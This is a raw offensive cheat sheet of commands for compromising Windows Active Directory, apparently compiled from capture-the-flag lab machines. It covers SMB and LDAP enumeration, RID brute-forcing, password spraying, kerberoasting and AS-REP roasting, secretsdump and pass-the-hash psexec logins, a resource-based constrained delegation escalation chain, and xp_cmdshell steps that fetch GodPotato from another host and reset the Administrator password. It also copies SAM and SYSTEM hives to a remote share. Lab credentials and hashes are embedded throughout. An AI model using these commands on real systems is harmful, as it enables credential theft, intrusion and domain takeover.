

crackmapexec smb 10.10.11.35 -u anonymous -p '' --rid-brute

crackmapexec smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'  --users





nxc smb 10.10.11.35 -u 'anonymous' -p '' --rid-brute




nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'

lious                 badpwdcount: 1 desc: Just in case I forget my password is aRt$Lp#7t*VQ!3

john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
CICADA-DC$
krbtgt
Guest
Administrator
emily.oscars

---------------------------------------------------------------------------------------
enum4linux

enum4linux 10.10.11.41

enum4linux -u judith.mader -p judith09 10.10.11.41

----------------------------------------------------------------------------------------

impacket

impacket-secretsdump 'administrator.htb'/'Ethan':'limpbizkit'@'10.10.11.42'

----------------------------------------------------------------------------------------
svc-alfresco@HTB.LOCAL

s3rvice

nxc smb 10.10.10.161

nxc smb 10.10.10.161 --username svc-alfresco --password s3rvice

nxc smb 10.10.10.161 --users --username svc-alfresco --password s3rvice

nxc smb 10.10.10.161 --groups --username svc-alfresco --password s3rvice

nxc smb 10.10.10.161 --computers --username svc-alfresco --password s3rvice

nxc smb 10.10.10.161 --local-groups --username svc-alfresco --password s3rvice

nxc smb 10.10.10.161 --pass-pol --username svc-alfresco --password s3rvice

nxc smb 10.10.10.161 --shares --username svc-alfresco --password s3rvice

nxc smb 10.10.10.161 --sam --username svc-alfresco --password s3rvice

nxc smb 10.10.11.35 -u 'anonymous' -p '' --rid-brute

nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'

nxc smb 10.10.11.14

nxc smb  10.10.11.14  --shares

nxc smb 10.10.11.14 -u ‘ . ’  -p ‘ ’ --shares

nxc smb 10.10.11.14 -u ‘  ’  -p ‘ ’ --shares

-----------------------------------------------------------------------------------------------

netexec

netexec smb 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'

netexec winrm 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'

netexec rdp 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'

netexec mssql 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'

crackmapexec winrm ip-list -u user.txt -p password.txt 

netexec winrm   192.168.122.96 -u user.txt -p password.txt --local-auth

netexec ldap  10.10.61.146 -u Eric.Wallows -p "EricLikesRunning800" --users
-----------------------------------------------------------------------------------------------

smb client


smb

nmap -v -sT -sV -sC  -p 445,139,135,137 --script=smb-enum-*  192.168.1.8,21

smbclient -L //10.10.10.97

smbclient //10.10.11.202/Public 

smbclient //10.10.11.174/support-tools

smbclient -L //10.10.10.97 -U tyler       ----for checking share

smbclient //10.10.10.97/new-site -U tyler      ------for login    if user known 

smbclient   //192.168.1.21/ADMIN$ -U 'administrator%@rmour123'     -----login with user id password

smbclient  -L //10.10.10.100/ -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18   ----check shares with username and password


smbclient //10.10.10.100/Replication -U ""%""   -----anonoumous login

smbclient //10.10.10.100/Replication -N

smbclient --list //192.168.1.35 -U  “ ”    -----show shares

smbclient   --list  //10.10.10.100 -U “”  -N  ------------Null sesssion with no password 

smbclient   --no-pass  //10.10.10.100/support-tools         -----login publick share with no password

smbclient //192.168.234.173/Apps -U "LAZER.COM\\Eric.Wallows%EricLikesRunning800"



-------------------------------------------------------------------------------------------------------------------------

smbmap

nmap --script smb-os-discovery 192.168.1.17

smbmap -H 192.168.1.40

smbmap -H 10.10.11.174 -u ananymous    ---show which share is public   

smbmap -H 192.168.1.17 -u raj -p 123

smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18

 hydra -L user.txt -P user.txt  smb://10.10.10.193
 
 hydra -L users.txt -P pwd.txt 10.129.2.5 smb


nmap -v -sT -p 445 --script=smb-vuln-* 10.10.10.4  


-------------------------------------------------------------------------------------------------------------------------

ldap enum


# 🌀 LDAP Enumeration

## 🔍 Nmap LDAP Scripts

### RootDSE Enumeration

nmap -v -p 389 --script=ldap-rootdse.nse -Pn 192.168.2.100
nmap -v -p 389,636 --script=ldap-rootdse.nse -Pn 192.168.2.100


### General LDAP Search

nmap -v -p 389,636 --script=ldap-search.nse -Pn 192.168.2.100
nmap -v -sV -sT --script=ldap* -p 389,636 192.168.2.100


## 🔐 Basic `ldapsearch` Syntax

### Help & Basic Connection

ldapsearch -h
ldapsearch -x -H ldap://192.168.2.100


### Scope Options

ldapsearch -x -H ldap://192.168.2.100 -s base
ldapsearch -x -H ldap://192.168.2.100 -s sub


### Query Naming Contexts

ldapsearch -x -H ldap://192.168.2.100 -s base namingcontexts
ldapsearch -x -H ldap://192.168.2.100 -s base -b "DC=infosecwarrior,DC=local" namingcontexts


## 🧾 Authentication Methods

### Anonymous Bind

ldapsearch -x -H ldap://192.168.2.100 -D ' ' -w ' ' -b "DC=infosecwarrior,DC=local"
ldapsearch -x -H ldap://192.168.2.100 -x -b "DC=htb,DC=local"
ldapsearch -x -H ldap://10.10.10.161 -D ' ' -w ' ' -b "DC=htb,DC=local" > htb.local-ldapsearch.txt

find admin password
ldapsearch -x -H "ldap://192.168.188.122" -D "hutch\fmcsorley" -w "CrabSharkJellyfish192" -b "dc=hutch,dc=offsec" '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd

cat htb.local-ldapsearch.txt | grep sAMAccountName



ldapsearch -x -H ldap://10.10.11.72 \
  -D "CN=henry,CN=Users,DC=tombwatcher,DC=htb" \
  -w 'H3nry_987TGV!' \
  -b "DC=tombwatcher,DC=htb"

### Authenticated Bind

ldapsearch -x -H ldap://192.168.2.100 -D 'infosecwarrior\jdoe' -w 'Password123!' -b "DC=infosecwarrior,DC=local"
ldapsearch -x -H ldap://192.168.2.100 -D 'jdoe@infosecwarrior.local' -w 'Password123!' -b "DC=infosecwarrior,DC=local"

ldapsearch -x -H ldap://10.10.11.72 \  -D "CN=henry,CN=Users,DC=tombwatcher,DC=htb" \  -w 'H3nry_987TGV!' \ -b "DC=tombwatcher,DC=htb"


## 📁 LDAP Object Extraction

### Full Directory Dump (base/rootDSE)

ldapsearch -H ldap://192.168.2.100 -x -s base -b ' ' "(objectClass=*)" '*' +


### Over LDAPS (Encrypted)

ldapsearch -H ldaps://192.168.2.100:636/ -x -s base -b ' ' "(objectClass=*)" '*' +


## 🎯 Targeted LDAP Queries

### Users

ldapsearch -x -H ldap://192.168.2.100 -b "CN=Users,DC=htb,DC=local"


### Computers

ldapsearch -x -H ldap://192.168.2.100 -b "CN=Computers,DC=infosecwarrior,DC=local"


### Specific User Info

ldapsearch -x -H ldap://192.168.2.100 -b "CN=Administrator,CN=Users,DC=infosecwarrior,DC=local"


### Group Memberships

ldapsearch -x -H ldap://192.168.2.100 -b "CN=Domain Admins,CN=Users,DC=infosecwarrior,DC=local"
ldapsearch -x -H ldap://192.168.2.100 -b "CN=Enterprise Admins,CN=Users,DC=infosecwarrior,DC=local"
ldapsearch -x -H ldap://192.168.2.100 -b "CN=Administrators,CN=Builtin,DC=infosecwarrior,DC=local"
ldapsearch -x -H ldap://192.168.2.100 -b "CN=Remote Desktop Users,CN=Builtin,DC=infosecwarrior,DC=local"


## 🧪 Post-Processing / Extraction

### Extract Usernames

cat ldapsearch-output.txt | grep sAMAccountName | cut -d " " -f 2 > usernames.txt
cat ldapsearch-output.txt | grep userPrincipalName | cut -d " " -f 2 | cut -d "@" -f1 >> usernames.txt


### Extract Passwords from Descriptions

cat ldapsearch-output.txt | grep -i desc | grep -i password: | cut -d " " -f 6 > passwords.txt

-------------------------------------------------------------------------------------------------------

kerbrute


# Kerbrute Enumeration and Attack Notes

kerbrute userenum --dc 10.10.10.100 -d streamio.htb  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

 kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL -o kerbrute.log user.txt -v
 
 impacket-GetNPUsers relia.com/ -dc-ip 172.16.84.6 -usersfile users.txt
 
 impacket-GetUserSPNs fluffy.htb/j.fleischman:'J0elTHEM4n1990!' -dc-ip 10.10.11.69 -request

impacket-GetNPUsers -dc-ip 10.129.45.226 blackfield.local/ -usersfile user3.txt > result.txt

GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile user.txt -format hashcat -outputfile hashes.txt -dc-ip 10.10.10.175 

 python3 /usr/local/bin/psexec.py 'medtech.com/leon':'rabbit:)'@172.16.199.10
 
 
 ln -s /opt/impacket/examples/psexec.py /usr/local/bin/psexec
chmod +x /usr/local/bin/psexechat  psexec 'celia.almeda:password!@192.168.216.153'

psexec.py WEB02/Administrator@192.168.244.121 -hashes b2c03054c306ac8fc5f9d188710b0168:b2c03054c306ac8fc5f9d188710b0168

psexec.py 'o.foller:EarlyMorningFootball777@192.168.185.160'
	
impacket-secretsdump 'administrator.htb'/'Ethan':'limpbizkit'@'10.10.11.42'

impacket-secretsdump Administrator:'December31'@192.168.164.147

python3 targetedKerberoast.py --dc-ip 10.10.11.42 -v -d administrator.htb -u Emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'

bloodhound-python -d tombwatcher.htb -u henry -p H3nry_987TGV! -ns 10.10.11.72 -c all

bloodhound-python -d resourced.local -u 'L.Livingstone' --hashes ':19a3a7550ce8c505c2d46b5e39d6f808' -ns 192.168.240.175 -c all

impacket-mssqlclient sql_svc@10.10.83.148  -windows-auth


-------------------------------------------------------------------

forward

EXEC xp_cmdshell 'cmd.exe /c "net use \\10.10.88.147\C$ /user:Administrator Password123!"';

EXEC xp_cmdshell 'cmd.exe /c copy \\10.10.88.147\C$\tmp\GodPotato-NET4.exe C:\tmp\GodPotato-NET4.exe';

EXEC xp_cmdshell 'cmd.exe /C C:\tmp\GodPotato-NET4.exe  -cmd "cmd /c net user Administrator Password123!"';

---------------------------------------------------------------------

reverse

net use \\10.10.88.147\C$ /user:Administrator Password123!

copy C:\windows.old\Windows\System32\SAM     \\10.10.88.147\C$\tmp\SAM

copy C:\windows.old\Windows\System32\SYSTEM     \\10.10.88.147\C$\tmp\SYSTEM

---------------------------------------------------------------------


RCBD ATTACk  

===========================================================
with hash

impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.240.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'

python3 rbcd.py -dc-ip 192.168.240.175 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone

unset KRB5CCNAME

impacket-getST -spn cifs/resourcedc.resourced.local 'resourced/attack$':'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.240.175 -debug

impacket-getST -spn cifs/resourcedc.resourced.local 'resourced/attack$':'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.240.175

export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache

sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.167.175


--------------------------------------------------------------

with  password

impacket-addcomputer resourced.local/l.livingstone:YourPasswordHere -dc-ip 192.168.240.175 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'


python3 rbcd.py -dc-ip 192.168.240.175 -t RESOURCEDC -f 'ATTACK' 'resourced\\l.livingstone:YourPasswordHere'


unset KRB5CCNAME


impacket-getST -spn cifs/resourcedc.resourced.local 'resourced/attack$':'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.240.175 -debug


export KRB5CCNAME=FILE:./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache

sudo impacket-psexec resourcedc.resourced.local -u 'resourced\\Administrator' -p 'YourPasswordHere' -dc-ip 192.168.167.175

--------------------------------------------------------------

## 1. Nmap Kerberos Enumeration


cd /usr/share/nmap/scripts/

nmap -v -sT -sV --script=krb5-enum-users.nse -p 88 10.10.10.161

nmap -v -sT -sV -p 88 --script=krb5.enum-users \
--script-args krb5.enum-users.realm='armourinfosec.local',userdb=/root/ad/username.txt \
192.168.1.50

nmap -v -sT -sV -p 88 --script=krb5.enum-users \
--script-args krb5.enum-users.realm='armourinfosec.local',userdb=/root/ad/username.txt \
192.168.1.50 -oA krb-users


## 2. Enum4linux-ng Enumeration


enum4linux-ng 10.10.10.161 -oA forest-enum4linux-ng-output

rpcclient -U "" -N 10.10.10.161


Interactive commands:

querydispinfo
querydominfo
enumdomusers
enumdomgroups


Extract usernames:

cat forest-enum4linux-ng-output.json | jq . | grep username | cut -d '"' -f 4

cat forest-enum4linux-ng-output.json | jq . | grep username | cut -d '"' -f 4 > usernames.txt


## 3. Kerbrute Username Enumeration


kerbrute userenum --dc 10.10.10.161 -d htb.local -o kerbrute.log usernames.txt

kerbrute userenum --dc 10.10.10.161 -d htb.local -o kerbrute.log usernames.txt -v

kerbrute userenum --dc 10.10.10.161 -d htb.local -o kerbrute.log usernames.txt --hash-file AS-REP-hash.txt


## 4. Password Spraying With Kerbrute

This technique tries a single password against many usernames.


1. Generate combo list (all username:password combinations)


for u in $(cat usernames.txt); do for p in $(cat passwords.txt); do echo "$u:$p"; done; done > combo.txt


2. Run Kerbrute with the combo file

kerbrute bruteforce --dc 192.168.198.97 -d secura.yzx combo.txt


3.Full verbose command example:


kerbrute bruteforce --dc 192.168.198.97 -d secura.yzx -v combo.txt



-----------------------------------------------------------------------------------------------------------------------

kerbrute passwordspray --dc 192.168.1.50 -d armourinfosec.local \ -o kerbrute.log krb-users-list.txt @rmour123

kerbrute passwordspray --dc 192.168.1.50 -d armourinfosec.local \ -o kerbrute.log krb-users-list.txt 12344321


## 5. Password Bruteforce Against A Specific User


kerbrute bruteforce --dc 192.168.1.50 -d armourinfosec.local /opt/passwords.txt administrator


## 6. Bruteforce Username And Password Combos


kerbrute bruteforce --dc 192.168.1.50 -d armourinfosec.local -o kerbrute.log \
/usr/share/seclists/Passwords/Default-Credentials/windows-betterdefaultpasslist.txt


## 7. GetNPUsers Enumeration with Impacket


impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -usersfile usernames.txt



GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out    

## 8. Kerbrute Installation Steps


git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
make all
go install
which kerbrute
cp -v /root/go/bin/kerbrute /usr/local/bin/
kerbrute -h


--------------------------------------------------------------------------------------------------------

grep command to short usernames from crackmapexec

grep 'SidTypeUser' user2.txt | sed -E 's/.*sequel\\([^ ]+) \(SidTypeUser\)/\1/'     -----from user.txt

Administrator
Guest
krbtgt
DC$
Tom.Henn
Brandon.Brown
Ryan.Cooper
sql_svc
James.Roberts
Nicole.Thompson


for group

grep 'SidTypeGroup' user2.txt | sed -E 's/.*sequel\\(.+) \(SidTypeGroup\)/\1/'   ----from user.txt

Enterprise Read-only Domain Controllers
Domain Admins
Domain Users
Domain Guests
Domain Computers
Domain Controllers
Schema Admins
Enterprise Admins
Group Policy Creator Owners
Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
Enterprise Key Admins
DnsUpdateProxy



---------------------------------------------------------------------------

for login

 psexec.py active.htb/administrator@10.10.10.100
 
 Ticketmaster1968
 
 
 
 -----------------------------------------------------------------------------
 
 find command
 find . -type f -name "*.txt" 2>/dev/null


----------------------------------------------------------------------------

awk password making command

create names.txt  and put usernames in it 
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb

awk '{
    fname = $1; lname = $2;
    print fname;                                # Fergus
    print fname substr(lname, 1, 1);            
    print substr(fname, 1, 1) lname;          
    print lname substr(fname, 1, 1);         
    print tolower(fname) "." tolower(lname);   
    print tolower(substr(fname, 1, 1)) "." tolower(lname); 
}' names.txt


save output in user.txt



